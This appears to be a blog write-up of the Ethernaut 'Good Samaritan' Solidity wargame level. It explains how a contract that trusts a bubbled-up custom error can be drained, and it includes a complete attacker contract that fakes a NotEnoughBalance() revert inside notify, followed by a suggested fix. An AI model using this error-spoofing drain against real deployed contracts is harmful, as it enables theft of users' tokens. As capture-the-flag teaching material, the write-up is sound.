@@ -1,0 +1,103 @@
+---
+title: Level 27 - Good Samaritan
+slug: level-27
+published: 06-09-2023
+lastEdited:
+imgSrc: /images/ethernaut/ethernaut27.svg
+---
+
+## Objectives
+
+1. Drain all tokens from the _Good Samaritan_.
+
+## Vulnerabilities
+
+### Expecting that errors comes from a specific contract
+
+Whenever an transaction is revert with a _custom error_. This error **bubbles up** until it's caught by a _try catch_. When multiple layers deep,
+the _try catch_ will only know what error is thrown but not from when it was reverted. This can be exploited.
+
+## Exploit
+
+We can see that the following function from `GoodSamaritan` will transfer all of the `GoodSamaritan` tokens if a specific error it thrown.
+This will be our _vector of attack_.
+
+```solidity
+function requestDonation() external returns(bool enoughBalance){
+    // donate 10 coins to requester
+    try wallet.donate10(msg.sender) {
+        return true;
+    } catch (bytes memory err) {
+        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+            // send the coins left
+            wallet.transferRemainder(msg.sender);
+            return false;
+        }
+    }
+}
+```
+
+Another point to notice is that if `msg.sender` in a _contract_, it will be notified by `INotifyable`.
+
+```solidity
+function transfer(address dest_, uint256 amount_) external {
+    uint256 currentBalance = balances[msg.sender];
+
+    // transfer only occurs if balance is enough
+    if(amount_ <= currentBalance) {
+        balances[msg.sender] -= amount_;
+        balances[dest_] += amount_;
+
+        if(dest_.isContract()) {
+            // notify contract 
+            INotifyable(dest_).notify(amount_);
+        }
+    } else {
+        revert InsufficientBalance(currentBalance, amount_);
+    }
+}
+```
+
+1. Let's write and deploy a _hack_ contract that will request funds from `GoodSamaritan`, since it's a contract and not 
+a EOA, `.notify(amount_)` will be called. Let's use that to `revert` with the `NotEnoughBalance()` error.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+import "./GoodSamaritan.sol";
+
+contract GoodSamaritanHack {
+    GoodSamaritan target;
+
+    constructor(address targetAddress){
+        target = GoodSamaritan(targetAddress);
+    }
+
+    // Same error as in wallet
+    error NotEnoughBalance();
+
+    function Drain() external {
+        target.requestDonation();
+    }
+
+    function notify(uint256 amount) external pure {
+        // the if is there to revert donate10 but not transferRemainder
+        if(amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+}
+```
+
+2. All that's left is calling the `Drain` function from our _hack contract_.
+
+## Suggested 
+
+1. Modify `donate10` to return a bool if the transaction succeeded or not. This way, the bool value can be 
+listened to instead of the specific error message.
+
+## Further reading
+
+- Examples of custom error messages <ExternalLink href={"https://solidity-by-example.org/error/"} />
+
